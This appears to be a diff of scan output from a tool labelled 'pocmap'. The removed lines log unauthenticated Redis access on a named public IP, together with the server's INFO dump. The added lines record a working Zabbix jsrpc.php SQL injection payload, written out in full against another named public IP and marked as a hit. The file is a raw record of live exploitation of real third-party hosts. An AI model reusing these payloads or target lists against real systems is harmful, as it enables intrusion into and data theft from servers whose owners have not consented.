@@ -1,53 +1,6 @@
 ======================= pocmap v1.0 =======================
-URL: 114.113.158.29
-type: redis unauth access  vul
-Port: 6379
-result: $1890
-# Server
-redis_version:3.0.7
-redis_git_sha1:00000000
-redis_git_dirty:0
-redis_build_id:adcdbe0d4e934f67
-redis_mode:standalone
-os:Linux 3.10.0-123.el7.x86_64 x86_64
-arch_bits:64
-multiplexing_api:epoll
-gcc_version:4.8.5
-process_id:92000
-run_id:ff2c7068b636ff36e797cc29281ea1b8b1c6b145
-tcp_port:6379
-uptime_in_seconds:137
-uptime_in_days:0
-hz:10
-lru_clock:11179257
-config_file:
-
-# Clients
-connected_clients:2
-client_longest_output_list:0
-client_biggest_input_buf:0
-blocked_clients:0
-
-# Memory
-used_memory:836856
-used_memory_human:817.24K
-used_memory_rss:4460544
-used_memory_peak:836856
-used_memory_peak_human:817.24K
-used_memory_lua:36864
-mem_fragmentation_ratio:5.33
-mem_allocator:jemalloc-3.6.0
-
-# Persistence
-loading:0
-rdb_changes_since_last_save:1
-rdb_bgsave_in_progress:0
-rdb_last_save_time:1470796912
-rdb_last_bgsave_status:ok
-rdb_last_bgsave_time_sec:-1
-rdb_current_bgsave_time_sec:-1
-aof_enabled:0
-aof_rewrite_in_progress:0
-aof_rewrite_scheduled:0
-aof_last_rewrite_tim
+URL: http://103.17.42.170:80
+type: zabbix SQL 2 Vul
+payload: http://103.17.42.170:80/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=2'3297&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1
+result: http://103.17.42.170:80/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=2'3297&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1 zabbix
 -----------------------------------------------------------
